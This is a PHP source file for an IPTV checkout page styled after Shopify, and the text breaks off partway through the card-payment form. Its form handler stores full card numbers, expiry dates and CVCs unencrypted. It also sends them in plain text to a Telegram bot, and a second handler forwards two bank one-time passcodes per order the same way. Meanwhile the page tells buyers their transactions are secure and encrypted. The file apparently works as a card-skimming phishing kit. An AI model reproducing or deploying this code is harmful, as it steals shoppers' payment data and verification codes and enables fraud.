<?php

declare(strict_types=1);

session_start();

$config = require __DIR__ . '/../config/config.php';
/** @var PDO $pdo */
$pdo = require __DIR__ . '/../config/database.php';

logVisit($pdo);

$postOfferId = isset($_POST['offer_id']) ? max(0, (int) $_POST['offer_id']) : null;
$offerId = $postOfferId !== null ? $postOfferId : (isset($_GET['offer']) ? max(0, (int) $_GET['offer']) : 0);

$paymentSuccess = false;
$confirmationCode = '';
$paymentError = '';
$isAjax = (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') || (isset($_POST['ajax']) && $_POST['ajax'] === '1');

$lang = 'en';
if (!empty($_GET['lang'])) {
    $lang = strtolower((string) $_GET['lang']) === 'fr' ? 'fr' : 'en';
} elseif (!empty($_COOKIE['site_lang'])) {
    $lang = strtolower((string) $_COOKIE['site_lang']) === 'fr' ? 'fr' : 'en';
} elseif (!empty($_SESSION['checkout_lang'])) {
    $lang = $_SESSION['checkout_lang'] === 'fr' ? 'fr' : 'en';
}
$_SESSION['checkout_lang'] = $lang;
if (!isset($_COOKIE['site_lang']) || $_COOKIE['site_lang'] !== $lang) {
    setcookie('site_lang', $lang, [
        'expires' => time() + 365 * 24 * 60 * 60,
        'path' => '/',
        'secure' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off'),
        'httponly' => false,
        'samesite' => 'Lax',
    ]);
}


$settings = getSettings($pdo);
$themeVars = getActiveThemeVars($settings['active_theme'] ?? 'onyx', $settings);
$brandTitleSetting = trim($settings['brand_title'] ?? '');
$brandName = $brandTitleSetting !== '' ? $brandTitleSetting : ($config['brand_name'] ?? 'ABDO IPTV CANADA');
$brandTaglineSetting = trim($settings['brand_tagline'] ?? '');
$brandTagline = $brandTaglineSetting !== '' ? $brandTaglineSetting : 'Ultra IPTV � Canada';
$brandLogoDesktop = trim($settings['brand_logo_desktop'] ?? '');
$brandLogoMobile = trim($settings['brand_logo_mobile'] ?? '');
if ($brandLogoMobile === '' && $brandLogoDesktop !== '') {
    $brandLogoMobile = $brandLogoDesktop;
}
$supportWhatsappNumber = trim($settings['support_whatsapp_number'] ?? '') ?: ($config['whatsapp_number'] ?? '');
$checkoutEnabled = ($settings['checkout_enabled'] ?? '1') === '1';
$checkoutWhatsappNumber = trim($settings['checkout_whatsapp_number'] ?? '') ?: $supportWhatsappNumber;
$checkoutTelegramChatId = trim($settings['checkout_telegram_chat_id'] ?? '');
$checkoutTelegramToken = trim($settings['checkout_telegram_bot_token'] ?? '');
$checkoutModeSetting = trim($settings['checkout_mode'] ?? '');
$checkoutMode = in_array($checkoutModeSetting, ['form', 'whatsapp', 'whop', 'paypal'], true)
    ? $checkoutModeSetting
    : ($checkoutEnabled ? 'form' : 'whatsapp');
$checkoutWhopPlanId = trim($settings['checkout_whop_plan_id'] ?? '');
$checkoutWhopProductId = trim($settings['checkout_whop_product_id'] ?? '');
$checkoutWhopLink = trim($settings['checkout_whop_link'] ?? '');
$checkoutPaypalLink = trim($settings['checkout_paypal_link'] ?? '');
$checkoutPaypalClientId = trim($settings['checkout_paypal_client_id'] ?? '');
$checkoutPaypalEnv = trim($settings['checkout_paypal_env'] ?? '');
if (!in_array($checkoutPaypalEnv, ['sandbox', 'live'], true)) {
    $checkoutPaypalEnv = 'sandbox';
}
$paypalCurrency = 'USD';
$whopCheckoutUrl = $checkoutWhopLink !== '' ? $checkoutWhopLink : '';
if ($whopCheckoutUrl === '' && $checkoutWhopPlanId !== '') {
    $whopCheckoutUrl = 'https://whop.com/checkout/' . rawurlencode($checkoutWhopPlanId);
    if ($checkoutWhopProductId !== '') {
        $whopCheckoutUrl .= '?product_id=' . rawurlencode($checkoutWhopProductId);
    }
} elseif ($whopCheckoutUrl === '' && $checkoutWhopProductId !== '') {
    $whopCheckoutUrl = 'https://whop.com/checkout/' . rawurlencode($checkoutWhopProductId);
}
$isFormCheckout = $checkoutMode === 'form';
$isWhopCheckout = $checkoutMode === 'whop';
$isPaypalCheckout = $checkoutMode === 'paypal';
$isWhatsappCheckout = $checkoutMode === 'whatsapp';
$paypalButtonEnabled = $isPaypalCheckout && $checkoutPaypalClientId !== '';
$paypalSdkUrl = '';
if ($paypalButtonEnabled) {
    $query = http_build_query([
        'client-id' => $checkoutPaypalClientId,
        'currency' => $paypalCurrency,
        'components' => 'buttons',
        'intent' => 'capture',
        'enable-funding' => 'card',
    ], '', '&', PHP_QUERY_RFC3986);
    $paypalSdkUrl = 'https://www.paypal.com/sdk/js?' . $query;
}
$checkoutFieldsSetting = $settings['checkout_fields_enabled'] ?? '';
$checkoutFieldsEnabled = json_decode($checkoutFieldsSetting, true);
if (!is_array($checkoutFieldsEnabled)) {
    $checkoutFieldsEnabled = ['first_name', 'last_name', 'company', 'address', 'apartment', 'city', 'country', 'state', 'zip', 'phone'];
}

function sendCheckoutTelegram(?string $token, ?string $chatId, string $message): void
{
    $token = trim((string) $token);
    $chatId = trim((string) $chatId);
    if ($token === '' || $chatId === '' || $message === '') {
        return;
    }
    $payload = [
        'chat_id' => $chatId,
        'text' => $message,
    ];
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $postFields = http_build_query($payload);

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postFields,
            CURLOPT_TIMEOUT => 3,
        ]);
        @curl_exec($ch);
        @curl_close($ch);
        return;
    }

    $opts = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => $postFields,
            'timeout' => 3,
        ],
    ];
    @file_get_contents($url, false, stream_context_create($opts));
}

$selectedOffer = null;
if ($offerId > 0) {
    $stmt = $pdo->prepare('SELECT * FROM offers WHERE id = :id LIMIT 1');
    $stmt->execute(['id' => $offerId]);
    $selectedOffer = $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
}

if (!$selectedOffer) {
    $offers = fetchAllAssoc($pdo, 'SELECT * FROM offers ORDER BY is_featured DESC, price ASC');
    $selectedOffer = $offers[0] ?? null;
}

if (!$selectedOffer) {
    $selectedOffer = [
        'id' => 0,
        'name' => 'IPTV Premium Pack',
        'duration' => '12 mois illimit�',
        'price' => 108.00,
        'features' => "Activation en moins de 10 minutes
Support WhatsApp FR/AR/EN
+40K cha�nes & VOD",
        'description' => 'Plan recommand� lorsque les offres ne sont pas encore configur�es.',
    ];
}

$offerName = $selectedOffer['name'] ?? 'IPTV Premium Pack';
$offerDuration = $selectedOffer['duration'] ?? '12 mois illimit�';
$offerPrice = formatCurrency((float) ($selectedOffer['price'] ?? 0));
$offerPriceNumber = number_format((float) ($selectedOffer['price'] ?? 0), 2, '.', '');
$paypalPurchaseDescription = trim($offerName . ' - ' . $offerDuration);
$offerDescription = trim($selectedOffer['description'] ?? '') ?: "Confirme ton plan premium et re�ois l'activation en 5-7 minutes.";
$offerFeatures = splitFeatures($selectedOffer['features'] ?? '');
$offerWhatsappNumber = trim($selectedOffer['whatsapp_number'] ?? '') ?: $checkoutWhatsappNumber;
$offerWhatsappMessage = $selectedOffer['whatsapp_message'] ?? null;
$whatsappLink = getWhatsappLink($offerWhatsappNumber, $offerName, (float) ($selectedOffer['price'] ?? 0), $offerDuration, $offerWhatsappMessage);

if ($isPaypalCheckout && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['paypal_capture'])) {
    $rawBody = file_get_contents('php://input');
    $payload = json_decode($rawBody, true);
    $orderId = isset($payload['orderId']) ? trim((string) $payload['orderId']) : '';
    $transactionId = isset($payload['transactionId']) ? trim((string) $payload['transactionId']) : '';
    $payerId = isset($payload['payerId']) ? trim((string) $payload['payerId']) : '';
    $status = isset($payload['status']) ? trim((string) $payload['status']) : '';
    $payerEmail = isset($payload['payerEmail']) ? trim((string) $payload['payerEmail']) : '';
    $payerName = isset($payload['payerName']) ? trim((string) $payload['payerName']) : '';
    $customerEmail = isset($payload['customerEmail']) ? trim((string) $payload['customerEmail']) : '';
    $customerPhone = isset($payload['customerPhone']) ? trim((string) $payload['customerPhone']) : '';
    $amountValue = isset($payload['amountValue']) ? (float) $payload['amountValue'] : 0.0;
    $amountCurrency = isset($payload['amountCurrency']) ? trim((string) $payload['amountCurrency']) : $paypalCurrency;
    $shippingName = isset($payload['shippingName']) ? trim((string) $payload['shippingName']) : '';
    $shippingPhone = isset($payload['shippingPhone']) ? trim((string) $payload['shippingPhone']) : '';
    $shippingLine1 = isset($payload['shippingLine1']) ? trim((string) $payload['shippingLine1']) : '';
    $shippingLine2 = isset($payload['shippingLine2']) ? trim((string) $payload['shippingLine2']) : '';
    $shippingCity = isset($payload['shippingCity']) ? trim((string) $payload['shippingCity']) : '';
    $shippingState = isset($payload['shippingState']) ? trim((string) $payload['shippingState']) : '';
    $shippingZip = isset($payload['shippingZip']) ? trim((string) $payload['shippingZip']) : '';
    $shippingCountry = isset($payload['shippingCountry']) ? trim((string) $payload['shippingCountry']) : '';

    $ok = $orderId !== '' && $status !== '' && $amountValue > 0;
    $confirmationCode = null;

    if ($ok) {
        $stmt = $pdo->prepare('INSERT INTO orders (offer_id, contact, first_name, last_name, company, address, city, country, state, zip, phone, card_number, expiry, cvc, card_name, discount, otp, otp2, payment_provider, payment_status, payment_reference, payment_email, payment_name, payment_amount, payment_currency, is_read) VALUES (:offer_id, :contact, :first_name, :last_name, :company, :address, :city, :country, :state, :zip, :phone, :card_number, :expiry, :cvc, :card_name, :discount, :otp, :otp2, :payment_provider, :payment_status, :payment_reference, :payment_email, :payment_name, :payment_amount, :payment_currency, :is_read)');
        $stmt->execute([
            'offer_id' => $offerId,
            'contact' => $customerEmail !== '' ? $customerEmail : ($payerEmail !== '' ? $payerEmail : $offerWhatsappNumber),
            'first_name' => $shippingName !== '' ? $shippingName : $payerName,
            'last_name' => '',
            'company' => null,
            'address' => trim($shippingLine1 . ' ' . $shippingLine2) ?: null,
            'city' => $shippingCity ?: null,
            'country' => $shippingCountry ?: null,
            'state' => $shippingState ?: null,
            'zip' => $shippingZip ?: null,
            'phone' => $customerPhone !== '' ? $customerPhone : ($shippingPhone ?: null),
            'card_number' => null,
            'expiry' => null,
            'cvc' => null,
            'card_name' => null,
            'discount' => null,
            'otp' => null,
            'otp2' => null,
            'payment_provider' => 'paypal',
            'payment_status' => $status,
            'payment_reference' => trim(
                ($transactionId !== '' ? 'TRX:' . $transactionId : '') .
                ($orderId !== '' ? ' | OID:' . $orderId : '') .
                ($payerId !== '' ? ' | PAYER:' . $payerId : '')
            ) ?: $orderId,
            'payment_email' => $payerEmail !== '' ? $payerEmail : $customerEmail,
            'payment_name' => $payerName !== '' ? $payerName : $shippingName,
            'payment_amount' => $amountValue,
            'payment_currency' => $amountCurrency,
            'is_read' => 0,
        ]);
        $confirmationCode = $pdo->lastInsertId();

        if ($checkoutTelegramChatId !== '' && $checkoutTelegramToken !== '') {
            $messageLines = [
                'New PayPal order #' . $confirmationCode,
                'Offer: ' . $offerName . ' (' . $offerDuration . ')',
                'Price: ' . $amountCurrency . ' ' . number_format($amountValue, 2),
                'Status: ' . $status,
                'PayPal order: ' . $orderId,
                'Transaction: ' . ($transactionId ?: 'N/A'),
                'Payer: ' . $payerName . ' (' . $payerEmail . ')',
                'Payer ID: ' . ($payerId ?: 'N/A'),
            ];
            $message = implode("\n", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
            sendCheckoutTelegram($checkoutTelegramToken, $checkoutTelegramChatId, $message);
        }
    }

    header('Content-Type: application/json');
    echo json_encode([
        'success' => $ok,
        'confirmation' => $confirmationCode,
        'transactionId' => $transactionId,
        'payerId' => $payerId,
        'error' => $ok ? null : 'Unable to record PayPal order.',
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isAjax && isset($_POST['otp_value'], $_POST['order_id'])) {
    $otpValue = substr(preg_replace('/\D/', '', (string) ($_POST['otp_value'] ?? '')), 0, 10);
    $orderId = max(0, (int) ($_POST['order_id'] ?? 0));
    $slot = (int) ($_POST['otp_slot'] ?? 1);
    $column = $slot === 2 ? 'otp2' : 'otp';
    $ok = false;
    if ($orderId > 0 && $otpValue !== '') {
        $stmt = $pdo->prepare(sprintf('UPDATE orders SET %s = :otp WHERE id = :id', $column));
        $stmt->execute([
            'otp' => $otpValue,
            'id' => $orderId,
        ]);
        $ok = $stmt->rowCount() > 0;
        if ($ok && $checkoutTelegramChatId !== '' && $checkoutTelegramToken !== '') {
            // Fetch order details
            $stmtOrder = $pdo->prepare('SELECT * FROM orders WHERE id = :id LIMIT 1');
            $stmtOrder->execute(['id' => $orderId]);
            $order = $stmtOrder->fetch(PDO::FETCH_ASSOC);
            if ($order) {
                // Fetch offer details
                $stmtOffer = $pdo->prepare('SELECT * FROM offers WHERE id = :id LIMIT 1');
                $stmtOffer->execute(['id' => $order['offer_id']]);
                $offer = $stmtOffer->fetch(PDO::FETCH_ASSOC);
                if ($offer) {
                    $otpLabel = $slot === 2 ? 'OTP2' : 'OTP1';
                    $otpValueSent = $slot === 2 ? trim((string) $order['otp2']) : trim((string) $order['otp']);
                    $messageLines = [
                        'OTP update for order #' . $order['id'],
                        $otpLabel . ': ' . $otpValueSent,
                    ];
                    $message = implode("\n", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
                    sendCheckoutTelegram($checkoutTelegramToken, $checkoutTelegramChatId, $message);
                }
            }
        }
    }
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $ok,
        'error' => $ok ? null : 'OTP update failed.',
    ]);
    exit;
}
if ($isFormCheckout && $_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $stmt = $pdo->prepare('INSERT INTO orders (offer_id, contact, newsletter, delivery, first_name, last_name, company, address, apartment, city, country, state, zip, phone, card_number, expiry, cvc, card_name, discount, otp, otp2) VALUES (:offer_id, :contact, :newsletter, :delivery, :first_name, :last_name, :company, :address, :apartment, :city, :country, :state, :zip, :phone, :card_number, :expiry, :cvc, :card_name, :discount, :otp, :otp2)');
        $stmt->execute([
            'offer_id' => $offerId,
            'contact' => $_POST['contact'] ?? '',
            'newsletter' => isset($_POST['newsletter']) ? 1 : 0,
            'delivery' => $_POST['delivery'] ?? '',
            'first_name' => $_POST['first_name'] ?? '',
            'last_name' => $_POST['last_name'] ?? '',
            'company' => $_POST['company'] ?? '',
            'address' => $_POST['address'] ?? '',
            'apartment' => $_POST['apartment'] ?? '',
            'city' => $_POST['city'] ?? '',
            'country' => $_POST['country'] ?? '',
            'state' => $_POST['state'] ?? '',
            'zip' => $_POST['zip'] ?? '',
            'phone' => $_POST['phone'] ?? '',
            'card_number' => $_POST['card_number'] ?? '',
            'expiry' => $_POST['expiry'] ?? '',
            'cvc' => $_POST['cvc'] ?? '',
            'card_name' => $_POST['card_name'] ?? '',
            'discount' => $_POST['discount'] ?? '',
            'otp' => null,
            'otp2' => null,
        ]);
        $confirmationCode = $pdo->lastInsertId();
        $paymentSuccess = true;

        if ($checkoutTelegramChatId !== '' && $checkoutTelegramToken !== '') {
            $messageLines = [
                'New checkout order #' . $confirmationCode,
                'Offer: ' . $offerName . ' (' . $offerDuration . ')',
                'Price: $' . $offerPrice,
                'Contact: ' . trim((string) ($_POST['contact'] ?? '')),
                'Newsletter: ' . (isset($_POST['newsletter']) ? 'Yes' : 'No'),
                'Delivery: ' . trim((string) ($_POST['delivery'] ?? '')),
                'Name: ' . trim((string) ($_POST['first_name'] ?? '')) . ' ' . trim((string) ($_POST['last_name'] ?? '')),
                'Company: ' . trim((string) ($_POST['company'] ?? '')),
                'Address: ' . trim((string) ($_POST['address'] ?? '')),
                'Apartment: ' . trim((string) ($_POST['apartment'] ?? '')),
                'City/State: ' . trim((string) ($_POST['city'] ?? '')) . ' / ' . trim((string) ($_POST['state'] ?? '')),
                'Country/ZIP: ' . trim((string) ($_POST['country'] ?? '')) . ' / ' . trim((string) ($_POST['zip'] ?? '')),
                'Phone: ' . trim((string) ($_POST['phone'] ?? '')),
                'card number: ' . str_replace(' ', '', $_POST['card_number'] ?? ''),
                'expiry: ' . str_replace(' ', '', $_POST['expiry'] ?? ''),
                'cvc: ' . ($_POST['cvc'] ?? ''),
                'card_name: ' . ($_POST['card_name'] ?? ''),
            ];
            $message = implode("\n", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
            sendCheckoutTelegram($checkoutTelegramToken, $checkoutTelegramChatId, $message);
        }

    } catch (\Throwable $e) {
        $paymentSuccess = false;
        $confirmationCode = '';
        $paymentError = $e->getMessage();
        @error_log('Checkout payment error: ' . $paymentError);
    }

    if ($isAjax) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => $paymentSuccess,
            'confirmation' => $confirmationCode,
            'error' => $paymentSuccess ? null : ($paymentError !== '' ? $paymentError : 'Payment could not be processed.'),
        ]);
        exit;
    }
} elseif (!$isFormCheckout && $_SERVER['REQUEST_METHOD'] === 'POST' && !$isAjax) {
    $redirectUrl = '';
    if ($isWhopCheckout && $whopCheckoutUrl !== '') {
        $redirectUrl = $whopCheckoutUrl;
    } elseif ($isPaypalCheckout && $checkoutPaypalLink !== '') {
        $redirectUrl = $checkoutPaypalLink;
    } else {
        $redirectUrl = $whatsappLink;
    }
    if ($redirectUrl !== '') {
        header('Location: ' . $redirectUrl);
        exit;
    }
}
$shouldBypassWhopRedirect = isset($_GET['preview_whop']) && $_GET['preview_whop'] === '1';
if ($isWhopCheckout && !$isAjax && $_SERVER['REQUEST_METHOD'] !== 'POST' && !$shouldBypassWhopRedirect && $whopCheckoutUrl !== '') {
    header('Location: ' . $whopCheckoutUrl);
    exit;
}

$basePath = appBasePath();
$docRoot = str_replace('\\', '/', rtrim($_SERVER['DOCUMENT_ROOT'] ?? '', '/'));
$publicBase = $basePath;
if ($docRoot === '' || !is_dir($docRoot . $publicBase . '/assets')) {
    $publicBase = rtrim($basePath . '/public', '/');
}
$assetBase = $publicBase . '/assets';
$posterImage = $assetBase . '/images/iptv-logo.svg';

$navText = $lang === 'fr'
    ? ['home' => 'Accueil', 'pricing' => 'Tarifs', 'movies' => 'Films et séries', 'faq' => 'FAQ', 'contact' => 'Contact']
    : ['home' => 'Home', 'pricing' => 'Pricing', 'movies' => 'Movies', 'faq' => 'FAQ', 'contact' => 'Contact'];

$seoTitle = 'Paiement - ' . $offerName . ' | ' . $brandName;
$seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration . ') avec un checkout façon Shopify.';

?>
<!DOCTYPE html>
<html lang="<?= e($lang) ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= e($seoTitle) ?></title>
    <meta name="description" content="<?= e($seoDescription) ?>">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="<?= $assetBase ?>/css/style.css?v=<?= time() ?>">
    <style>
        :root {
            <?php foreach ($themeVars as $var => $value): ?>
            <?= $var ?>: <?= e($value) ?>;
            <?php endforeach; ?>
        }

        .checkout-header {
            position: sticky;
            top: 0;
            z-index: 12;
            background: transparent;
            transition: transform 0.18s ease, opacity 0.18s ease;
        }

        .checkout-header .header-shell {
            max-width: 1240px;
            margin: 0.5rem auto;
            padding: 0.5rem 0.75rem;
        }

        .checkout-header .site-header {
            background: linear-gradient(135deg, rgba(12, 14, 21, 0.95), rgba(10, 12, 18, 0.92));
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 999px;
            padding: 0.75rem 1.35rem;
            display: flex;
            align-items: center;
            gap: 1.5rem;
            box-shadow: 0 18px 32px rgba(0, 0, 0, 0.4);
        }

        .checkout-header .nav-wrapper {
            gap: 1rem;
        }

        .checkout-header .site-nav a {
            color: rgba(255, 255, 255, 0.9);
            font-weight: 600;
        }

        .checkout-header .site-nav a:hover {
            color: #fff;
        }

        .checkout-header .lang-switch {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .checkout-header .lang-switch button {
            padding: 0.35rem 0.65rem;
            border: 1px solid var(--border-color, rgba(255, 255, 255, 0.16));
            background: var(--surface-300, rgba(255, 255, 255, 0.04));
            color: inherit;
            border-radius: 999px;
            font-weight: 600;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: all 0.2s ease;
            min-width: 46px;
        }

        .checkout-header .lang-switch button.active {
            background: var(--accent-500, #7c3aed);
            color: #fff;
            border-color: var(--accent-500, #7c3aed);
            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.25);
        }

        .checkout-header .lang-switch button:focus {
            outline: 2px solid var(--accent-500, #7c3aed);
            outline-offset: 2px;
        }

        .checkout-header.hidden {
            transform: translateY(-100%);
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body class="checkout-page">
    <div class="noise"></div>
    <header class="checkout-header" id="top">
        <div class="header-shell">
            <div class="site-header">
                <div class="logo">
                    <?php if ($brandLogoDesktop || $brandLogoMobile): ?>
                        <picture class="logo-picture">
                            <?php if ($brandLogoMobile): ?>
                                <source srcset="<?= e($brandLogoMobile) ?>" media="(max-width: 720px)">
                            <?php endif; ?>
                            <img src="<?= e($brandLogoDesktop ?: $brandLogoMobile) ?>" alt="<?= e($brandName) ?>">
                        </picture>
                    <?php else: ?>
                        <span class="logo-icon">IPTV</span>
                    <?php endif; ?>
                    <div>
                        <strong><?= e($brandName) ?></strong>
                        <small><?= e($brandTagline) ?></small>
                    </div>
                </div>

                <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="siteNav" data-menu-toggle>
                    <span class="sr-only">Open menu</span>
                    <span></span>
                    <span></span>
                    <span></span>
                </button>

                <div class="nav-wrapper" data-menu-panel>
                    <nav id="siteNav" class="site-nav">
                        <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#top" data-i18n-key="nav-home" data-i18n-default="Home" data-keep-lang><?= e($navText['home']) ?></a>
                        <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#offres" data-i18n-key="nav-pricing" data-i18n-default="Pricing" data-keep-lang><?= e($navText['pricing']) ?></a>
                        <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#movies" data-i18n-key="nav-movies" data-i18n-default="Movies" data-keep-lang><?= e($navText['movies']) ?></a>
                        <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#faq" data-i18n-key="nav-faq" data-i18n-default="FAQ" data-keep-lang><?= e($navText['faq']) ?></a>
                        <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#support" data-i18n-key="nav-contact" data-i18n-default="Contact" data-keep-lang><?= e($navText['contact']) ?></a>
                    </nav>

                    <div class="lang-switch" aria-label="Language">
                        <button type="button" data-lang-switch="en" class="<?= $lang === 'en' ? 'active' : '' ?>">EN</button>
                        <button type="button" data-lang-switch="fr" class="<?= $lang === 'fr' ? 'active' : '' ?>">FR</button>
                    </div>

                </div>
            </div>
        </div>
    </header>
    <div class="mobile-nav-backdrop" data-menu-backdrop hidden></div>
    <main class="checkout-main">
        <section class="payment-checkout" data-animate>
            <div class="payment-card">
                <div class="payment-column payment-column--primary">
                    <div class="checkout-offer-info">
                        <div>
                            <strong><?= e($offerName) ?></strong>
                            <span><?= e($offerDuration) ?></span>
                        </div>
                        <span class="price-tag">$<?= e($offerPrice) ?></span>
                    </div>
                    <?php if ($isFormCheckout): ?>
                    <form class="checkout-form" action="<?= e($_SERVER['REQUEST_URI'] ?? '') ?>" method="post" novalidate>
                        <input type="hidden" name="offer_id" value="<?= (int) $offerId ?>">
                        <div class="form-head">
                            <h3 data-i18n-key="contact-heading" data-i18n-default="Contact information">Contact information</h3>
                        </div>
                        <label>
                            <span data-i18n-key="contact-label" data-i18n-default="Email or mobile phone number">Email or mobile phone number</span>
                            <input type="text" name="contact" placeholder="jane.doe@email.com" required>
                        </label>
                        <label class="checkbox">
                            <input type="checkbox" name="newsletter" checked>
                            <span data-i18n-key="newsletter" data-i18n-default="Email me with news and offers">Email me with news and offers</span>
                        </label>
                        <div class="form-head">
                            <h3 data-i18n-key="delivery-heading" data-i18n-default="Delivery method">Delivery method</h3>
                        </div>
                        <div class="delivery-options">
                            <label class="delivery-option">
                                <input type="radio" name="delivery" value="ship" checked>
                                <div class="delivery-option__details">
                                    <div>
                                        <strong data-i18n-key="delivery-ship" data-i18n-default="Ship">Ship</strong>
                                        <small data-i18n-key="delivery-ship-note" data-i18n-default="Activation digitale en 5-7 min">Activation digitale en 5-7 min</small>
                                    </div>
                                </div>
                            </label>
                            <label class="delivery-option">
                                <input type="radio" name="delivery" value="pickup">
                                <div class="delivery-option__details">
                                    <div>
                                        <strong data-i18n-key="delivery-pickup" data-i18n-default="Pick up">Pick up</strong>
                                        <small data-i18n-key="delivery-pickup-note" data-i18n-default="Support WhatsApp ou e-mail">Support WhatsApp ou e-mail</small>
                                    </div>
                                </div>
                            </label>
                        </div>
                        <div class="form-head">
                            <h3 data-i18n-key="shipping-heading" data-i18n-default="Shipping address">Shipping address</h3>
                        </div>
                        <?php if (in_array('first_name', $checkoutFieldsEnabled, true) || in_array('last_name', $checkoutFieldsEnabled, true)): ?>
                        <div class="inline-inputs">
                            <?php if (in_array('first_name', $checkoutFieldsEnabled, true)): ?>
                            <label>First name
                                <input type="text" name="first_name" placeholder="John" required>
                            </label>
                            <?php endif; ?>
                            <?php if (in_array('last_name', $checkoutFieldsEnabled, true)): ?>
                            <label>Last name
                                <input type="text" name="last_name" placeholder="Smith" required>
                            </label>
                            <?php endif; ?>
                        </div>
                        <?php endif; ?>
                        <?php if (in_array('company', $checkoutFieldsEnabled, true)): ?>
                        <label>Company (optional)
                            <input type="text" name="company" placeholder="ABDO IPTV">
                        </label>
                        <?php endif; ?>
                        <?php if (in_array('address', $checkoutFieldsEnabled, true)): ?>
                        <label>Address
                            <input type="text" name="address" placeholder="123 Av. du Mont-Royal" required>
                        </label>
                        <?php endif; ?>
                        <?php if (in_array('apartment', $checkoutFieldsEnabled, true)): ?>
                        <label>Apartment, suite, etc. (optional)
                            <input type="text" name="apartment" placeholder="Unit 302">
                        </label>
                        <?php endif; ?>
                        <?php if (in_array('city', $checkoutFieldsEnabled, true)): ?>
                        <label>City
                            <input type="text" name="city" placeholder="Montréal" required>
                        </label>
                        <?php endif; ?>
                        <?php if (in_array('country', $checkoutFieldsEnabled, true) || in_array('state', $checkoutFieldsEnabled, true) || in_array('zip', $checkoutFieldsEnabled, true)): ?>
                        <div class="shipping-grid">
                            <?php if (in_array('country', $checkoutFieldsEnabled, true)): ?>
                            <label>Country/region
                                <select name="country" required>
                                    <option>Canada</option>
                                    <option>United States</option>
                                    <option>France</option>
                                </select>
                            </label>
                            <?php endif; ?>
                            <?php if (in_array('state', $checkoutFieldsEnabled, true)): ?>
                            <label>State / Province
                                <input type="text" name="state" placeholder="QC" required>
                            </label>
                            <?php endif; ?>
                            <?php if (in_array('zip', $checkoutFieldsEnabled, true)): ?>
                            <label>ZIP / Postal code
                                <input type="text" name="zip" placeholder="H2X 1Y4" required>
                            </label>
                            <?php endif; ?>
                        </div>
                        <?php endif; ?>
                        <?php if (in_array('phone', $checkoutFieldsEnabled, true)): ?>
                    <label>Phone
                        <input type="text" name="phone" placeholder="+1 514 555 0000" required>
                    </label>
                        <?php endif; ?>
                    <div class="payment-confirmation" <?= $paymentSuccess ? '' : 'hidden' ?> data-payment-confirmation>
                        <div class="confirmation-icon">✔</div>
                        <div>
                            <strong>Thank you!</strong>
                            <p>Confirmation #<span data-confirmation-code><?= e($confirmationCode) ?></span></p>
                        </div>
                    </div>
                    <div class="card-payment">
                        <div class="card-payment__head">
                            <div>
                                <span class="card-payment__label">Payment</span>
                                <p>All transactions are secure and encrypted.</p>
                            </div>
                            <div class="card-payment__icons">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg" alt="Visa" loading="lazy" width="38" height="24">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/mastercard.1c4_lyMp.svg" alt="Mastercard" loading="lazy">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg" alt="American Express" loading="lazy">
                                <span class="card-payment__more" tabindex="0">
                                    +5
                                    <span class="card-payment__popover" aria-hidden="true">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/discover.C7UbFpNb.svg" alt="Discover">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/jcb.BgZHqF0u.svg" alt="JCB">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/diners_club.B9hVEmwz.svg" alt="DINERS CLUB">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/unionpay.8M-Boq_z.svg" alt="UNIONPAY">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/elo.Clup5T29.svg" alt="Elo">
                                    </span>
                                </span>
                            </div>
                    </div>
                        <div class="card-payment__grid">
                            <label class="card-input">
                                Card number
                                <div class="card-input__field">
                                    <input type="text" name="card_number" placeholder="1234 1234 1234 1234" data-card-number inputmode="numeric" autocomplete="cc-number" maxlength="19" pattern="[0-9 ]*" required>
                                    <span class="card-brand" data-card-brand hidden>
